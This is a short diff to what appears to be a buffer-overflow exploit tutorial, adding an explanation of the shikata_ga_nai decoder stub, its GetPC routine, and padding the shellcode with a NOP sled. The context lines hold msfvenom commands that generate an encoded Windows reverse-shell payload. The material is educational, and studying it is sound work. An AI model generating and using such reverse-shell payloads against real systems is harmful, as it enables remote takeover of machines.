@@ -366,3 +366,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -fc
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -fc -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 ```
+
+Note that we are constructing a encoded shellcode using `shikata_ga_nai`, which means that our shellcode is not directly executable and is prepended with a decoder stub. The job of this decoder stub is to iterate over the encoded shellcode and decode it. To accomplish this, the decoder stub needs to gather its own address in memory, and also look ahead to locate the encoded shellcode. The code will perform a series of assembly instructions to get its address in memory, which is also called `GetPC` routine. `GetPC` is a short routine that moves the value of `EIP`, aka `PC` or program counter, into another register. 
+
+Unfortunately, `shikata_ga_nai` decoder has a side effect that will modify the values at or around the top of the stack, this means that we cannot directly insert our payload right after offset. One solution is that we can move the encoded shellcode further back in our buffer (~20 bytes) and padded the gap with `0x90` (`NOP SLED`).
